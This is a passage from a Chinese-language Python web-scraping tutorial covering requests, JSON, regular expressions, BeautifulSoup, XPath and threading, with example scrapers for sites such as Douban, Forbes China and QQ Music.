class="string">f&quot;https://www.sogou.com/web?query=<span class="subst">&#123;query&#125;</span>&quot;</span></span><br><span class="line"><span class="comment">#获取网页源码</span></span><br><span class="line">html = requests.get(url,headers=headers)</span><br><span class="line"><span class="comment">#设置字符格式</span></span><br><span class="line">response = html.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"><span class="comment">#将进程关闭</span></span><br><span class="line">html.close()</span><br></pre></td></tr></table></figure>
-
-<h4 id="案例-抓取豆瓣电影喜剧排行前20排行榜">1.1.1.2. 案例:抓取豆瓣电影喜剧排行前20排行榜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line"><span class="comment">#parmams是重新封装参数</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;limit&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url,params=params,headers=headers)<span class="comment">#params可以拼接URL</span></span><br><span class="line"><span class="built_in">print</span>(res.json())</span><br><span class="line">res.close()</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Json">1.1.2. Json</h3><h4 id="基础介绍-1">1.1.2.1. 基础介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">json----轻量级的文本数据交换格式</span><br><span class="line">用法：&#123;</span><br><span class="line">json.dumps():对数据进行编码，将字典转换成字符串</span><br><span class="line">json.loads():对数据进行解码，将字符串转为字典</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="案例">1.1.2.2. 案例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;no&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:<span class="string">&quot;baidu&quot;</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">json_str = json.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;python原数据格式为：<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;json数据格式为：<span class="subst">&#123;json_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="POST">1.1.3. POST</h3><h4 id="案例：百度翻译">1.1.3.1. 案例：百度翻译</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的英文单词&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;https://fanyi.baidu.com/sug&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;kw&#x27;</span>:s</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#以字典的方式放在data参数中去请求</span></span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure>
-
-<h3 id="防盗链">1.1.4. 防盗链</h3><h4 id="案例：抓取梨视频源文件链接">1.1.4.1. 案例：抓取梨视频源文件链接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#部分链接通过改变参数来阻止爬虫直接获取链接</span></span><br><span class="line">url = <span class="string">&quot;https://www.pearvideo.com/video_1750583&quot;</span></span><br><span class="line">contId = url.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">video_statusURL = <span class="string">f&#x27;https://www.pearvideo.com/videoStatus.jsp?contId=<span class="subst">&#123;contId&#125;</span>&amp;mrd=0.05754613101901107&#x27;</span></span><br><span class="line"><span class="comment">#Referer字段是防盗链，溯源请求的上一级</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: url</span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(video_statusURL,headers=headers)</span><br><span class="line"><span class="comment">#转换为json格式可从子节点逐级寻找</span></span><br><span class="line">video = res.json()[<span class="string">&#x27;videoInfo&#x27;</span>][<span class="string">&#x27;videos&#x27;</span>][<span class="string">&#x27;srcUrl&#x27;</span>]</span><br><span class="line">systemtime = res.json()[<span class="string">&#x27;systemTime&#x27;</span>]</span><br><span class="line">video1 = video.replace(systemtime,<span class="string">f&#x27;cont-<span class="subst">&#123;contId&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(video1)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Re-正则表达式">1.2. Re-正则表达式</h2><h3 id="基础介绍-2">1.2.1. 基础介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">#正则表达式测试网址：https://tool.oschina.net/regex/</span><br><span class="line">#下列字符被称为元字符（默认只匹配一个字符）</span><br><span class="line">&#123;</span><br><span class="line">.       匹配除换行符意外的其他任意字符</span><br><span class="line">\w      匹配字母|数字|下划线|汉字</span><br><span class="line">\s      匹配任意的空白符</span><br><span class="line">\d      匹配数字</span><br><span class="line">\n      匹配一个换行符</span><br><span class="line">\t      匹配一个制表符</span><br><span class="line">\b		代表单词边界</span><br><span class="line">\r		代表回车，光标向下一行</span><br><span class="line"></span><br><span class="line">^       匹配字符串的开始</span><br><span class="line">$       匹配字符串的结尾</span><br><span class="line">    </span><br><span class="line">\W      匹配非字母|数字|下划线</span><br><span class="line">\D      匹配非数字</span><br><span class="line">\S      匹配非空白符</span><br><span class="line">()      匹配括号内的表达式，也表示一个组</span><br><span class="line">[...]   匹配字符组中的字符</span><br><span class="line">[^...]  匹配除了字符组中字符的所有字符</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#量词：控制元字符出现的次数</span><br><span class="line">&#123;</span><br><span class="line">*       重复0次或以上</span><br><span class="line">+       重复1次或以上</span><br><span class="line">?       重复0次或1次</span><br><span class="line">&#123;n&#125;     重复n次</span><br><span class="line">&#123;n,&#125;    重复n次或以上</span><br><span class="line">&#123;n,m&#125;   重复n到m次</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#贪婪匹配和非贪婪匹配</span><br><span class="line">.*      贪婪匹配，尽可能多的匹配</span><br><span class="line">.*?     非贪婪匹配，尽可能少的匹配</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text1 = <span class="string">&quot;我的qq邮箱是1554089600@qq.com，你的邮箱是1554089600@163.com&quot;</span></span><br><span class="line"><span class="comment">#1、compile()预加载正则</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">&quot;\d+.\w+.\w+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、findall()匹配所有符合正则表达式的内容，返回的是列表</span></span><br><span class="line">list1 = obj.findall(text1)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3、finditer()匹配所有符合正则表达式的内容,返回的是迭代器，从迭代器中拿到内容需要.group()</span></span><br><span class="line">it = obj.finditer(text1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="built_in">print</span>(i.group())</span><br><span class="line"></span><br><span class="line"><span class="comment">#4、search()匹配第一个符合正则表达式的内容,返回的是match对象，拿出内容需要.group()</span></span><br><span class="line">s = obj.search(text1)</span><br><span class="line"><span class="built_in">print</span>(s.group())</span><br><span class="line"></span><br><span class="line"><span class="comment">#5、match()从头开始匹配符合的正则表达式，等同于^，拿出内容需要.group()，None时不能使用.group()</span></span><br><span class="line">m = obj.match(text1)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
-
-<h3 id="案例1：抓取福布斯中国排行榜">1.2.2. 案例1：抓取福布斯中国排行榜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://www.forbeschina.com/lists/1773&quot;</span></span><br><span class="line">html = requests.get(url,headers=headers)</span><br><span class="line">res = html.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#(?P&lt;分组名字&gt;正则)给匹配正则的字符串命名，可以在后续的group()中取出</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td&gt;(?P&lt;a&gt;.*?)&lt;/td&gt;&#x27;</span>,re.S)<span class="comment">#re.S能让.匹配换行符</span></span><br><span class="line">it = obj.finditer(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="built_in">print</span>(i.group(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">html.close()</span><br></pre></td></tr></table></figure>
-
-<h3 id="案例2：获得豆瓣电影top250">1.2.3. 案例2：获得豆瓣电影top250</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;filter&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url,params=params,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">obj1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;li&gt;.*?&lt;img width=&quot;100&quot; alt=&quot;(?P&lt;moviename&gt;.*?)&quot; src=.*?(?P&lt;year&gt;\d+)&amp;nbsp;.*?(?P&lt;score&gt;\d\W\d)&lt;/span&gt;&#x27;</span>,re.S)</span><br><span class="line">result1 = obj1.finditer(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;电影：<span class="subst">&#123;i.group(<span class="string">&quot;moviename&quot;</span>)&#125;</span>,年份：<span class="subst">&#123;i.group(<span class="string">&quot;year&quot;</span>)&#125;</span>，评分：<span class="subst">&#123;i.group(<span class="string">&quot;score&quot;</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="案例3：获取电影天堂磁力链接">1.2.4. 案例3：获取电影天堂磁力链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#正则匹配子页网址</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a href=&quot;(?P&lt;urlspl&gt;.*?)&quot; class=&quot;ulink&quot;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制抓取页数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">    url = <span class="string">f&#x27;https://www.dytt8.net/html/tv/hytv/list_71_<span class="subst">&#123;i&#125;</span>.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    <span class="comment">#获取每个子页的网址</span></span><br><span class="line">    result = obj.finditer(res)</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">        <span class="comment">#将子页网址进行拼接</span></span><br><span class="line">        url_correct = <span class="string">f&#x27;https://www.dytt8.net/<span class="subst">&#123;it.group(<span class="string">&quot;urlspl&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        res = requests.get(url_correct, headers=headers).content.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment">#正则匹配磁力链接</span></span><br><span class="line">        obj1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;.mp4&quot;&gt;(?P&lt;download&gt;.*?)&lt;/a&gt;&lt;/td&gt;&#x27;</span>)</span><br><span class="line">        result1 = obj1.finditer(res)</span><br><span class="line">        <span class="keyword">for</span> it1 <span class="keyword">in</span> result1:</span><br><span class="line">            <span class="built_in">print</span>(it1.group(<span class="string">&#x27;download&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<h2 id="Beautiful-Soup">1.3. Beautiful Soup</h2><h3 id="基础介绍-3">1.3.1. 基础介绍</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">response = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(response,<span class="string">&quot;lxml&quot;</span>)<span class="comment">#创建对象，lxml是bs4的指定解析器</span></span><br><span class="line"><span class="comment">#按照html标准的缩进格式的结构输出,且会自动补齐成对标签</span></span><br><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br><span class="line"></span><br><span class="line">findAll()以列表的形式显示所有符合的标签</span><br><span class="line">用法：findAll(标签，属性=值，[数量]),</span><br><span class="line">标签可以单个，多个时需加[]如[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;p&#x27;</span>] </span><br></pre></td></tr></table></figure>
-
-<h3 id="案例：抓取qq音乐热歌榜-歌名、歌手、歌曲链接">1.3.2. 案例：抓取qq音乐热歌榜,歌名、歌手、歌曲链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url = <span class="string">&quot;https://y.qq.com/n/ryqq/toplist/26&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(response,<span class="string">&quot;lxml&quot;</span>)<span class="comment">#创建对象，lxml是bs4的指定解析器</span></span><br><span class="line"><span class="comment">#匹配所有img且标签为属性class值为songlist__pic</span></span><br><span class="line">m = soup.findAll(<span class="string">&quot;img&quot;</span>,attrs=&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;songlist__pic&quot;</span>&#125;)</span><br><span class="line">n = soup.findAll(<span class="string">&quot;a&quot;</span>,attrs=&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;playlist__author&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#遍历标签</span></span><br><span class="line"><span class="keyword">for</span> music <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(music.get(<span class="string">&#x27;alt&#x27;</span>))<span class="comment">#获取具体某个属性的值</span></span><br><span class="line"><span class="keyword">for</span> singer <span class="keyword">in</span> n:</span><br><span class="line">    <span class="built_in">print</span>(singer.get(<span class="string">&#x27;title&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;歌曲：<span class="subst">&#123;m.get(<span class="string">&quot;alt&quot;</span>)&#125;</span>，歌手：<span class="subst">&#123;n.get(<span class="string">&quot;title&quot;</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Xpath">1.4. Xpath</h2><h3 id="基础介绍-4">1.4.1. 基础介绍</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#lxml的etree模块中才包含xpath解析</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="comment">#xml声明只能在开头进行</span></span><br><span class="line">xml = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;bookstore&gt;</span></span><br><span class="line"><span class="string">    &lt;book&gt;</span></span><br><span class="line"><span class="string">      &lt;div&gt;</span></span><br><span class="line"><span class="string">      &lt;title lang=&quot;eng&quot;&gt;Harry Potter1&lt;/title&gt;</span></span><br><span class="line"><span class="string">      &lt;price&gt;29.99&lt;/price&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">        &lt;title lang=&quot;eng&quot;&gt;Harry Potter2&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;price&gt;29.99&lt;/price&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;</span></span><br><span class="line"><span class="string">        &lt;title lang=&quot;eng&quot;&gt;Harry Potter3&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;price&gt;29.99&lt;/price&gt;</span></span><br><span class="line"><span class="string">        &lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/book&gt;</span></span><br><span class="line"><span class="string">    &lt;parent&gt;</span></span><br><span class="line"><span class="string">      &lt;title lang=&quot;eng&quot;&gt;Learning XML&lt;/title&gt;</span></span><br><span class="line"><span class="string">      &lt;price&gt;39.95&lt;/price&gt;</span></span><br><span class="line"><span class="string">    &lt;/parent&gt;</span></span><br><span class="line"><span class="string">&lt;/bookstore&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">xml = xml.encode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#将文档设置编码格式</span></span><br><span class="line">tree = etree.XML(xml)<span class="comment">#创建对象</span></span><br><span class="line">result = tree.xpath(<span class="string">&quot;book/div/title&quot;</span>)<span class="comment">#寻找book下的title子节点</span></span><br><span class="line">result1 = tree.xpath(<span class="string">&quot;book/div/title/text()&quot;</span>)<span class="comment">#text()拿取文本</span></span><br><span class="line"><span class="built_in">print</span>(result1)</span><br><span class="line">result2 = tree.xpath(<span class="string">&quot;book/div//title/text()&quot;</span>)<span class="comment">#//可以拿取父节点下所有符合的子节点，子节点的子节点...</span></span><br><span class="line"><span class="built_in">print</span>(result2)</span><br><span class="line">result3 = tree.xpath(<span class="string">&quot;//title/text()&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result3)</span><br></pre></td></tr></table></figure>
-
-<h3 id="案例：获取浙理工某网站的所有a标签的herf的属性值">1.4.2. 案例：获取浙理工某网站的所有a标签的herf的属性值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">url = <span class="string">&quot;https://sky.zstu.edu.cn/sy.htm&quot;</span></span><br><span class="line">res = requests.get(url).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">tree = etree.HTML(res)</span><br><span class="line"><span class="comment">#抓取网页中a标签的所有a标签的href值</span></span><br><span class="line">url_link = tree.xpath(<span class="string">&#x27;//a/@href&#x27;</span>)<span class="comment">#@xxx代表属性值</span></span><br><span class="line"><span class="built_in">print</span>(url_link)</span><br><span class="line"><span class="comment">#在网页对应内容的源码中右键复制xpath可直接获得当前内容的xpath！！</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="多线程">1.5. 多线程</h2><h3 id="基础介绍-5">1.5.1. 基础介绍</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;func<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = Thread(target=func)<span class="comment">#创建线程对象</span></span><br><span class="line">    t.start()<span class="comment">#将线程状态设置为开启</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;main<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#运行时可以观察到func和main函数是同时打印</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="线程池">1.6. 线程池</h2><h3 id="案例：获取整本斗破苍穹小说">1.6.1. 案例：获取整本斗破苍穹小说</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor<span class="comment">#导入线程池</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span 